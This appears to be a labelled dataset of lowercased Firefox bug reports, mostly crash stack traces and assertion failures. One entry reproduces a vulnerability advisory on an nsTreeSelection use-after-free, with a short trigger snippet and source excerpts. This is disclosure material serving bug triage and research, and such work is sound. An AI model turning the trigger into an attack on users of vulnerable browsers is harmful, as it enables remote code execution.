nscolumnsetframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=3 line 1035 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=0 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=3 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=0 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowfloat nsblockreflowstate astate const nsrect afloatavailablespace nsiframe afloat nsmargin afloatmargin unsigned int areflowstatus=0 line 5657 bytes c gklayout.dll nsblockreflowstate flowandplacefloat nsiframe afloat unsigned int areflowstatus=0 int aforcefit=1 line 768 c gklayout.dll nsblockreflowstate addfloat nslinelayout alinelayout nsiframe afloat int aavailablewidth=58428 unsigned int areflowstatus=0 line 580 bytes c gklayout.dll nslinelayout addfloat nsiframe afloat int aavailablewidth=58428 unsigned int areflowstatus=0 line 218 c gklayout.dll nslinelayout reflowframe nsiframe aframe unsigned int areflowstatus=0 nshtmlreflowmetrics ametrics int apushedframe=0 line 892 bytes c gklayout.dll nsblockframe reflowinlineframe nsblockreflowstate astate nslinelayout alinelayout nslinelist_iterator aline nsiframe aframe linereflowstatus alinereflowstatus line 3745 bytes c gklayout.dll nsblockframe doreflowinlineframes nsblockreflowstate astate nslinelayout alinelayout nslinelist_iterator aline nsflowarearect afloatavailablespace int aavailablespaceheight=0 nsfloatmanager savedstate afloatstatebeforeline int akeepreflowgoing linereflowstatus alinereflowstatus int aallowpullup=1 line 3539 bytes c gklayout.dll nsblockframe reflowinlineframes nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3396 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2439 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=0 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=0 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nscanvasframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 554 c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=3 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nshtmlscrollframe reflowscrolledframe scrollreflowstate astate int aassumehscroll=0 int aassumevscroll=1 nshtmlreflowmetrics ametrics int afirstpass=1 line 545 bytes c gklayout.dll nshtmlscrollframe reflowcontents scrollreflowstate astate const nshtmlreflowmetrics adesiredsize line 639 bytes c gklayout.dll nshtmlscrollframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 840 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=0 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll viewportframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 285 bytes c gklayout.dll presshell doreflow nsiframe target int ainterruptible=1 line 7373 c gklayout.dll presshell processreflowcommands int ainterruptible=1 line 7493 bytes c gklayout.dll presshell flushpendingnotifications mozflushtype atype=flush_interruptiblelayout line 4930 bytes c gklayout.dll presshell reflowevent run line 7180 c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 527 bytes c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 250 bytes c gkwidget.dll nsbaseappshell run line 170 bytes c toolkitcomps.dll nsappstartup run line 182 bytes c xul.dll xre_main int argc=4 char argv const nsxreappdata aappdata line 3499 bytes c firefox.exe ns_internal_main int argc=4 char argv line 158 bytes c firefox.exe wmain int argc=4 wchar_t argv line 120 bytes c firefox.exe tmaincrtstartup line 594 bytes c firefox.exe wmaincrtstartup line 414 c kernel32.dll 7c817077 frames below may be incorrect and/or missing no symbols loaded for kernel32.dll mozjs.dll nanojit assembler resourceconsistencycheck line 256 bytes c uconv.dll nsshiftjistounicodeconstructor nsisupports aouter const nsid aiid void aresult line 436 bytes c xpcom_core.dll nssupportscharimpl addref line 449 bytes c	11
assertion failure mcontext tempvaluerooters mtvr mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.1.7pre gecko/20091217 shiretoko/3.5.7pre debug steps to reproduce load crashes after a few seconds on load also crashes on 1.9.2 but different stack assertion failure mcontext tempvaluerooters mtvr at c work\mozilla\b uilds\1.9.1\mozilla\firefox-debug\dist\include\js\jscntxt.h:1071 3c4.840 break instruction exception code 80000003 second chance eax=00000091 ebx=0012edf0 ecx=2c0ba550 edx=10313d38 esi=08aba000 edi=00000000 eip=7c90120e esp=0012ebbc ebp=0012ebc0 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 7c90120e cc int 3 0:000 cdb reading initial command load winext\msec.dll logappend exploitab le k q exploitability classification unknown recommended bug title breakpoint starting at ntdll dbgbreakpoint 0000 called from gkplugin jsautotempvaluerooter jsautotempvaluerooter 0000000031 hash while a breakpoint itself is probably not exploitable it may also be an indicat ion that an attacker is testing a target in either case breakpoints should not exist in production code childebp retaddr warning stack unwind information not available following frames may be wrong 0012ebc0 0750b501 ntdll dbgbreakpoint 0012ebd8 0750aef3 gkplugin jsautotempvaluerooter jsautotempvaluerooter 0012ed4c 08606102 gkplugin evaluate 0012ed88 085058e1 npswf32 np_shutdown 0012ede4 085b9774 npswf32 0012ee98 08570238 npswf32 0012f0c4 085a47d8 npswf32 0012f168 0860959a npswf32 0012f23c 1021cb0a npswf32 np_shutdown 0012f24c 1021bb21 msvcr80d crtisvalidheappointer 0012f268 0045936a msvcr80d free_dbg 0012f27c 004593ba nspr4 md_current_thread 00d153f8 00000000 nspr4 md_current_thread quit	11
crash nsrootboxframe removeframe nsframe destroy nsframelist destroyframes with popup menuitem and body onload removing window see zipped up testcase to reproduce the crash unzip the testcase then open the file named parentframe.htm it should crash after 500ms after a reload it also crashes firefox3.0.7 so marking security sensitive for now 0 1 xul.dll nsrootboxframe removeframe layout/xul/base/src/nsrootboxframe.cpp:209 2 xul.dll nscssframeconstructor contentremoved layout/base/nscssframeconstructor.cpp:7234 3 xul.dll presshell contentremoved layout/base/nspresshell.cpp:4895 4 xul.dll nsgenericelement doremovechildat content/base/src/nsgenericelement.cpp:3377 5 xul.dll nsdocument removechildat content/base/src/nsdocument.cpp:3252 6 xul.dll nsgenericelement doremovechild content/base/src/nsgenericelement.cpp:3984 7 xul.dll nsdocument removechild content/base/src/nsdocument.cpp:5462 8 xul.dll nsidomnode_removechild obj-firefox/js/src/xpconnect/src/dom_quickstubs.cpp:4183 9 js3250.dll js_interpret js/src/jsinterp.cpp:5147 10 js3250.dll js_invoke js/src/jsinterp.cpp:1388 11 js3250.dll js_internalinvoke js/src/jsinterp.cpp:1441 12 js3250.dll js_callfunctionvalue js/src/jsapi.cpp:5196 13 xul.dll nsjscontext calleventhandler dom/base/nsjsenvironment.cpp:2007 14 xul.dll nsjseventlistener handleevent dom/src/events/nsjseventlistener.cpp:247 15 xul.dll nseventlistenermanager handleeventsubtype content/events/src/nseventlistenermanager.cpp:1090 16 xul.dll nseventlistenermanager handleevent content/events/src/nseventlistenermanager.cpp:1187 17 xul.dll nseventtargetchainitem handleeventtargetchain content/events/src/nseventdispatcher.cpp:315 18 xul.dll nseventdispatcher dispatch content/events/src/nseventdispatcher.cpp:508 19 xul.dll nsimageboxframeevent run layout/xul/base/src/nsimageboxframe.cpp:130 20 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:510 21 xul.dll nsbaseappshell run widget/src/xpwidgets/nsbaseappshell.cpp:170 22 xul.dll nsappstartup run toolkit/components/startup/src/nsappstartup.cpp:192 23 nspr4.dll pr_getenv 24 firefox.exe wmain toolkit/xre/nswindowswmain.cpp:110 25 firefox.exe firefox.exe 26 kernel32.dll baseprocessstart firefox3.0.7 has a different stacktrace 0 xul.dll nsframe destroy mozilla/layout/generic/nsframe.cpp:500 1 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 2 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 3 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 4 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 5 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 6 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 7 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 8 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 9 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 10 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 11 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 12 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 13 xul.dll nslinebox deletelinelist mozilla/layout/generic/nslinebox.cpp:340 14 xul.dll nsblockframe destroy mozilla/layout/generic/nsblockframe.cpp:301 15 xul.dll nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 16 xul.dll nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 17 xul.dll nsboxframe removeframe mozilla/layout/xul/base/src/nsboxframe.cpp:1025 18 xul.dll nsrootboxframe removeframe mozilla/layout/xul/base/src/nsrootboxframe.cpp:212 19 xul.dll nscssframeconstructor contentremoved mozilla/layout/base/nscssframeconstructor.cpp:9644 20 xul.dll presshell contentremoved mozilla/layout/base/nspresshell.cpp:4724 etc	11
nsobjectframe does n't properly handle npp_new failing for np_full libgobject-2.0.so.0.2000.1 steps 1 find a plugin that returns an error from npp_new for mode=np_full you can apply the patch from this comment and build in modules/plugin/test to get one 2 load your full page plugin e.g data application/x-test hi 3 resize the window actual results about to create new xtbin of 992 x 721 from nil firefox-bin mozilla-central/widget/src/gtkxtbin/gtk2xtbin.c:316 gtk_xtbin_new assertion parent_window void 0 failed program received signal sigabrt aborted in from lib/ld-linux.so.2 gdb bt 0 in from lib/ld-linux.so.2 1 in raise from lib/tls/i686/cmov/libc.so.6 2 in abort from lib/tls/i686/cmov/libc.so.6 3 in assert_fail from lib/tls/i686/cmov/libc.so.6 4 in gtk_xtbin_new parent_window f at mozilla-central/widget/src/gtkxtbin/gtk2xtbin.c:316 5 in nspluginnativewindowgtk2 creatextwindow this at mozilla-central/modules/plugin/base/src/nspluginnativewindowgtk2.cpp:408 6 in nspluginnativewindowgtk2 callsetwindow this aplugininstance at mozilla-central/modules/plugin/base/src/nspluginnativewindowgtk2.cpp:222 7 in nsobjectframe callsetwindow this at mozilla-central/layout/generic/nsobjectframe.cpp:989 8 in nsobjectframe didreflow this aprescontext areflowstate astatus=1 at mozilla-central/layout/generic/nsobjectframe.cpp:1094 9 in nslinelayout reflowframe this aframe areflowstatus ametrics apushedframe at mozilla-central/layout/generic/nslinelayout.cpp:990 10 in nsblockframe reflowinlineframe this astate alinelayout aline mcurrent mlistlink aframe alinereflowstatus at mozilla-central/layout/generic/nsblockframe.cpp:3594 11 in nsblockframe doreflowinlineframes this astate alinelayout aline mcurrent mlistlink akeepreflowgoing alinereflowstatus aallowpullup=1 at mozilla-central/layout/generic/nsblockframe.cpp:3415 12 in nsblockframe reflowinlineframes this astate aline mcurrent mlistlink akeepreflowgoing at mozilla-central/layout/generic/nsblockframe.cpp:3262 13 in nsblockframe reflowline this astate aline mcurrent mlistlink akeepreflowgoing at mozilla-central/layout/generic/nsblockframe.cpp:2317 14 in nsblockframe reflowdirtylines this astate at mozilla-central/layout/generic/nsblockframe.cpp:1897 15 in nsblockframe reflow this aprescontext ametrics areflowstate astatus at mozilla-central/layout/generic/nsblockframe.cpp:944 16 in nsblockreflowcontext reflowblock this aspace aapplytopmargin=1 aprevmargin aclearance=0 aisadjacentwithtop=1 aline aframers aframereflowstatus astate at mozilla-central/layout/generic/nsblockreflowcontext.cpp:310 17 in nsblockframe reflowblockframe this astate aline mcurrent mlistlink akeepreflowgoing at mozilla-central/layout/generic/nsblockframe.cpp:2990 18 in nsblockframe reflowline this astate aline mcurrent mlistlink akeepreflowgoing at mozilla-central/layout/generic/nsblockframe.cpp:2262 19 in nsblockframe reflowdirtylines this astate at mozilla-central/layout/generic/nsblockframe.cpp:1897 20 in nsblockframe reflow this aprescontext ametrics areflowstate astatus at mozilla-central/layout/generic/nsblockframe.cpp:944 21 in nscontainerframe reflowchild this akidframe aprescontext adesiredsize areflowstate ax=0 ay=0 aflags=0 astatus atracker at mozilla-central/layout/generic/nscontainerframe.cpp:821 22 in canvasframe reflow this aprescontext adesiredsize areflowstate astatus at mozilla-central/layout/generic/nshtmlframe.cpp:656 23 in nscontainerframe reflowchild this akidframe aprescontext adesiredsize areflowstate ax=0 ay=0 aflags=3 astatus type return to continue or q return to quit q atrackquit gdb up 1 in raise from lib/tls/i686/cmov/libc.so.6 gdb 2 in abort from lib/tls/i686/cmov/libc.so.6 gdb 3 in assert_fail from lib/tls/i686/cmov/libc.so.6 gdb 4 in gtk_xtbin_new parent_window f at mozilla-central/widget/src/gtkxtbin/gtk2xtbin.c:316 316 assert parent_window null current language auto currently c gdb p parent_window 37 gdkwindow gdb up 5 in nspluginnativewindowgtk2 creatextwindow this at mozilla-central/modules/plugin/base/src/nspluginnativewindowgtk2.cpp:408 408 msocketwidget gtk_xtbin_new gdkwindow 0 current language auto currently c gdb 6 in nspluginnativewindowgtk2 callsetwindow this aplugininstance at mozilla-central/modules/plugin/base/src/nspluginnativewindowgtk2.cpp:222 222 creatextwindow gdb 7 in nsobjectframe callsetwindow this at mozilla-central/layout/generic/nsobjectframe.cpp:989 989 window callsetwindow pi gdb for reference the instantiate path is something like this 0 in nsobjectframe instantiateplugin this apluginhost amimetype application/x-test auri at mozilla-central/layout/generic/nsobjectframe.cpp:896 more stack frames follow gdb bt 0 in nsobjectframe instantiateplugin this apluginhost amimetype application/x-test auri at mozilla-central/layout/generic/nsobjectframe.cpp:896 1 in nsobjectframe instantiate this amimetype application/x-test auri at mozilla-central/layout/generic/nsobjectframe.cpp:1808 2 in nspluginstreamlistener setupplugin this at mozilla-central/content/html/document/src/nsplugindocument.cpp:192 3 in nspluginstreamlistener onstartrequest this request ctxt at mozilla-central/content/html/document/src/nsplugindocument.cpp:114 4 in nsdocumentopeninfo onstartrequest this request actxt at mozilla-central/uriloader/base/nsuriloader.cpp:290 5 in nsbasechannel onstartrequest this request ctxt at mozilla-central/netwerk/base/src/nsbasechannel.cpp:665 6 in nsinputstreampump onstatestart this at mozilla-central/netwerk/base/src/nsinputstreampump.cpp:439 7 in nsinputstreampump oninputstreamready this stream at mozilla-central/netwerk/base/src/nsinputstreampump.cpp:395 8 in nsinputstreamreadyevent run this at mozilla-central/xpcom/io/nsstreamutils.cpp:111 9 in nsthread processnextevent this maywait=1 result at mozilla-central/xpcom/threads/nsthread.cpp:510 10 in ns_processnextevent_p thread maywait=1 at nsthreadutils.cpp:230 11 in nsbaseappshell run this at mozilla-central/widget/src/xpwidgets/nsbaseappshell.cpp:170 12 in nsappstartup run this at mozilla-central/toolkit/components/startup/src/nsappstartup.cpp:192 13 in xre_main argc=1 argv aappdata at mozilla-central/toolkit/xre/nsapprunner.cpp:3232 14 in main argc=1 argv at mozilla-central/browser/app/nsbrowserapp.cpp:156 gdb they re from different sessions	11
crash nstextcontrolframe calcintrinsicsize with execcommand inserthtml ib and undo null deref nstextcontrolframe calcintrinsicsize	11
assertion invalid array index with overflow scroll float left text-transform changing style assertion should have been cleared mbreaksinks.isempty file layout/generic/nstextframethebes.cpp line 648 assertion should have reset before destruction mcurrentword.length 0 file content/base/src/nslinebreaker.cpp line 51 assertion invalid array index i length file nstarray.h line 317 assertion hmm something went wrong aoffset should have been found mglyphruns start mcharacteroffset aoffset file gfx/thebes/src/gfxfont.cpp line 2189 security-sensitive because the invalid array index assertion is in an unchecked array access function	11
assertion incorrect astate.mprevchild before inserting line at end assertion incorrect astate.mprevchild before inserting line at end astate.mprevchild mframes.lastchild file users/jruderman/mozilla-central/layout/generic/nsblockframe.cpp line 2162 bz marked a previous bug with this assertion as security-sensitive bug 522170 so i m filing this one as security-sensitive	11
assertion not an element node element with execcommand outdent combining acute accent assertion not an element node element file nshtmleditrules.cpp line 8814 assertion attempting to allocate excessively large array error file nstarray.cpp line 69	11
assertion attempting to allocate excessively large array with execcommand outdent combining acute accent this bug was initially created as a clone of bug 499844 testcase assertion attempting to allocate excessively large array error file nstarray.cpp line 69 see bug 499844 comment 14 16 and 17	11
nstreerange contains date/time 2007-03-29 17:54:05.050 0300 os version 10.4.9 build 8p2137 report version 4 command firefox-bin path users/ui/desktop/minefield.app/contents/macos/firefox-bin parent launchd 1 version 3.0a4pre 3.0a4pre pid 485 thread 0 exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 org.mozilla.firefox nstreerange contains int 9 1 org.mozilla.firefox nstreeselection selectcallback nsitimer void 235 2 org.mozilla.firefox nstreebodyframe prefillpropertyarray int nstreecolumn 221 3 org.mozilla.firefox nstreebodyframe paintrow int nsrect const nsprescontext nsirenderingcontext nsrect const nspoint 64 4 org.mozilla.firefox nstreebodyframe painttreebody nsirenderingcontext nsrect const nspoint 1165 5 org.mozilla.firefox nstreebodyframe painttreebody nsirenderingcontext nsrect const nspoint 1234 6 org.mozilla.firefox nsdisplaygeneric paint nsdisplaylistbuilder nsirenderingcontext nsrect const 71 7 org.mozilla.firefox nsdisplaylist paint nsdisplaylistbuilder nsirenderingcontext nsrect const const 47 8 org.mozilla.firefox nsdisplayclip paint nsdisplaylistbuilder nsirenderingcontext nsrect const 119 9 org.mozilla.firefox nsdisplaylist paint nsdisplaylistbuilder nsirenderingcontext nsrect const const 47 10 org.mozilla.firefox nslayoututils paintframe nsirenderingcontext nsiframe nsregion const unsigned 425 11 org.mozilla.firefox nsipresshell removeweakframe nsweakframe 504 12 org.mozilla.firefox nsviewmanager renderviews nsview nsirenderingcontext nsregion const nsidrawingsurface 232 13 org.mozilla.firefox nsviewmanager refresh nsview nsirenderingcontext nsiregion unsigned 695 14 org.mozilla.firefox nsviewmanager flushpendinginvalidates 3035 15 org.mozilla.firefox nsview loadwidget nsid const 188 16 org.mozilla.firefox nschildview nschildview in-charge deleting 2518 17 org.mozilla.firefox nschildview dispatchwindowevent nsguievent 34 18 org.mozilla.firefox nschildview reportmoveevent 1594 19 com.apple.appkit nsview drawrect clip 3228 20 com.apple.appkit nsview recursivedisplayrectifneededignoringopacity isvisiblerect rectisvisiblerectforview topview 1273 21 com.apple.appkit nsview recursivedisplayrectifneededignoringopacity isvisiblerect rectisvisiblerectforview topview 3239 22 com.apple.appkit nsview displayrectignoringopacity isvisiblerect rectisvisiblerectforview 523 23 com.apple.appkit nsview displayifneeded 439 24 org.mozilla.firefox nschildview onpaint nspaintevent 39 25 org.mozilla.firefox nsviewmanager updatewidgetsforview nsview 35 26 org.mozilla.firefox nsviewmanager updatewidgetsforview nsview 114 27 org.mozilla.firefox nsviewmanager getabsoluterect nsview nsrect const nsrect 213 28 org.mozilla.firefox nsviewmanager updatewidgetarea nsview nsregion const nsview 1506 29 org.mozilla.firefox nsiframe invalidateroot nsrect const int int int 104 30 org.mozilla.firefox viewportframe invalidateinternal nsrect const int int nsiframe int 144 31 org.mozilla.firefox nsiframe invalidate nsrect const int 121 32 org.mozilla.firefox nstreebodyframe getimagesourcerect nsstylecontext int imgicontainer 302 33 org.mozilla.firefox nstreeselection selectcallback nsitimer void 492 34 org.mozilla.firefox nstreeselection nstreeselection in-charge 2383 35 libxpcom_core.dylib ns_invokebyindex 81 36 org.mozilla.firefox xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode 738 37 org.mozilla.firefox xpc_wn_callmethod jscontext jsobject unsigned long long 261 38 libmozjs.dylib js_invoke 790 39 libmozjs.dylib js_interpret 3773 40 libmozjs.dylib js_invoke 2215 41 libmozjs.dylib js_internalinvoke 146 42 libmozjs.dylib js_callfunctionvalue 62 43 org.mozilla.firefox nsjscontext calleventhandler nsisupports void void nsiarray nsivariant 624 44 org.mozilla.firefox nsjseventlistener nsjseventlistener in-charge deleting 570 45 org.mozilla.firefox nsxblprototypehandler executehandler nsidomeventreceiver nsidomevent 1539 46 org.mozilla.firefox nsxblmouseeventhandler eventmatched nsidomevent 382 47 org.mozilla.firefox nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsisupports unsigned 75 48 org.mozilla.firefox nseventlistenermanager fixcontextmenuevent nsprescontext nsisupports nsevent nsidomevent 1462 49 org.mozilla.firefox nseventtargetchainitem handleevent nseventchainpostvisitor unsigned 129 50 org.mozilla.firefox nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned nsdispatchingcallback 487 51 org.mozilla.firefox nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback 747 52 org.mozilla.firefox presshell handleeventinternal nsevent nsiview nseventstatus 289 53 org.mozilla.firefox presshell retargeteventtoparent nsguievent nseventstatus 1024 54 org.mozilla.firefox nsviewmanager handleevent nsview nspoint nsguievent int 71 55 org.mozilla.firefox nsviewmanager flushpendinginvalidates 1119 56 org.mozilla.firefox nsview loadwidget nsid const 188 57 org.mozilla.firefox nschildview nschildview in-charge deleting 2518 58 org.mozilla.firefox nschildview dispatchwindowevent nsguievent 34 59 org.mozilla.firefox nschildview nschildview in-charge 5623 60 com.apple.appkit nswindow sendevent 7377 61 com.apple.appkit nsapplication sendevent 5023 62 com.apple.appkit nsapplication run 547 63 org.mozilla.firefox nsappshell processnextnativeevent int 519 64 org.mozilla.firefox nsappstartup attemptingquit int 279 65 org.mozilla.firefox xre_main 8100 66 org.mozilla.firefox main 32 67 org.mozilla.firefox start 270 68 org.mozilla.firefox start 41	11
nstreeselection eventlistener use-after-free remote code execution vulnerability zdi-can-669 zdi-can-669 mozilla firefox nstreeselection eventlistener use-after-free remote code execution vulnerability abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.5.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on software utilizing a vulnerable version of mozilla s firefox user interaction is required in that the victim must visit a malicious website or be coerced into opening a malicious document the specific flaw exists within how the application handles particular events for an nstreeselection element upon execution of a select event the application will access an element without checking to see if it s been previously freed or not successful exploitation can lead to code execution under the context of the application this vulnerability occurs due to firing an event on an object that has already been freed and can be reproduced with the following code tree id tr flex 1 treechildren treeitem treerow treecell treerow treeitem treechildren tree tree document.getelementbyid tr tree.addeventlistener select function e false tree.view.selection.timedselect 0 5000 xxx fire select event in 5 seconds tree.view.selection null xxx freed upon calling timedselect on a tree.view.selection object the application will instantiate a new timer and call selectcallback when it fires layout/xul/base/src/tree/src/nstreeselection.cpp:336 ns_imethodimp nstreeselection timedselect print32 aindex print32 amsec prbool suppressselect msuppressed if amsec 1 msuppressed pr_true nsresult rv select aindex if ns_failed rv return rv if amsec 1 msuppressed suppressselect if msuppressed if mselecttimer mselecttimer cancel mselecttimer do_createinstance mozilla.org/timer 1 mselecttimer initwithfunccallback selectcallback this amsec xxx nsitimer type_one_shot return ns_ok at this point a malicious individual will want to free the tree.view.selection the timer has been created for once the timer fires the callback will then be executed the following code will load the closure representing the callback and then execute it layout/xul/base/src/tree/src/nstreeselection.cpp:847 void nstreeselection selectcallback nsitimer atimer void aclosure nstreeselection self static_cast nstreeselection aclosure if self self fireonselecthandler xxx atimer cancel self mselecttimer nsnull the select handler that s been fired will load the code for the event and then execute it at this point the tree.view.selection object has been freed layout/xul/base/src/tree/src/nstreeselection.cpp:827 nsresult nstreeselection fireonselecthandler if msuppressed mtree return ns_ok nscomptr nsiboxobject boxobject do_queryinterface mtree ns_assertion boxobject no box object if boxobject return ns_error_unexpected nscomptr nsidomelement elt boxobject getelement getter_addrefs elt ns_ensure_state elt nsrefptr nspldomevent event new nspldomevent elt ns_literal_string select event rundomeventwhensafe xxx return ns_ok version s tested firefox 3.6.5 platform s tested windows xp sp3 credit this vulnerability was discovered by regenrecht further details if you have any questions comments concerns or require additional details please feel free to contact me via the following kate fly security liaison tippingpoint kfly tippingpoint.com office 1 512.681.8219 we can alternatively be reached via e-mail at zdi-disclosures tippingpoint.com our pgp key is available from	11
nseditingsession.cpp uses initwithfunccallback in a suspicious way 1061 what keeps docshell alive	11
crash nsviewmanager createview nscssframeconstructor addframeconstructionitemsinternal on closing print preview with moz-transform position fixed table displays see testcase which crashes current trunk build when closing the print preview window 0 kernel32.dll kernel32.dll 1 mozcrt19.dll cxxthrowexception throw.cpp:159 2 mozcrt19.dll operator new obj-firefox/memory/jemalloc/crtsrc/new.cpp:57 3 xul.dll nsviewmanager createview view/src/nsviewmanager.cpp:276 4 xul.dll nsboxframe cacheattributes layout/xul/base/src/nsboxframe.cpp:287 5 xul.dll nsmenupopupframe init layout/xul/base/src/nsmenupopupframe.cpp:147 0 kernel32.dll kernel32.dll 1 mozcrt19.dll cxxthrowexception throw.cpp:159 2 mozcrt19.dll operator new obj-firefox/memory/jemalloc/crtsrc/new.cpp:57 3 xul.dll nscssframeconstructor addframeconstructionitemsinternal layout/base/nscssframeconstructor.cpp:5338 4 xul.dll nscssframeconstructor processchildren layout/base/nscssframeconstructor.cpp:9579 5 xul.dll nscssframeconstructor constructframefromiteminternal layout/base/nscssframeconstructor.cpp:3927 6 